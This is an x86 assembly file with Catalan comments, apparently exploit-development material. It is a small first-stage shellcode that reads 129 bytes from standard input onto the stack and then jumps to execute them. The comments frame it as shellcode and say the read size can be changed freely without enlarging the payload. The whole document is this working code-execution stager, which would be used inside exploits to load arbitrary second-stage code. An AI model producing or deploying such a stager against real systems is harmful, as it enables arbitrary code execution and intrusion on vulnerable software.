	.file	"small_read.c"
	.text
.globl main
	.type	main, @function
main:
	movl	%esp, %ecx # a ecx el parametre del read que sera la direccio on guardar. en aquest
                       # cas pot ser una mica perillos no pujar el esp ja que matxacarem dades de la 
                       # pila del proces que teniem fins ara
	movl	$129, %edx # quantitat de bytes a llegir per el read. Podem posar el valor que volguem
                       # sense augmentar el tamany del shellcode.
    xor %ebx, %ebx     # ebx = a 0 pq llegim de lestandard input
	movl	$3, %eax   # eax = 3 q es el read
	int $0x80          # fer la crida a sistema
	call	*%esp      # saltar a executar el codi que hem copiat
	.size	main, .-main
	.section	.note.GNU-stack,"",@progbits
	.ident	"GCC: (GNU) 3.4.6 (Gentoo 3.4.6-r2 p1.5, ssp-3.4.6-1.0, pie-8.7.10)"

